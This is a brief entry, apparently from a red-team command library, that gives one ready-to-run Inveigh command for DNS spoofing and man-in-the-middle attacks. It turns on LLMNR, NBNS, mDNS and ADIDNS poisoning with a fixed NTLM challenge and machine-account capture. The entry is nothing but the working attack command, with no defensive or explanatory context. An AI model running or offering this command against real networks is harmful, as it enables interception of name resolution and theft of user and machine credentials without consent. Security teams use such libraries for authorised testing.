---
id: 20f69a31-43b5-4883-b81b-97a3b6021a68
name: Inveigh DNS spoofing and man-in-the-middle attack
type: command
executor: bash
data: Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3
  -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
output: null
created_at: '2023-04-06T03:56:06.634897+00:00'
updated_at: '2023-04-10T20:26:13.842619+00:00'
---

# Inveigh DNS spoofing and man-in-the-middle attack

```bash
Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
```
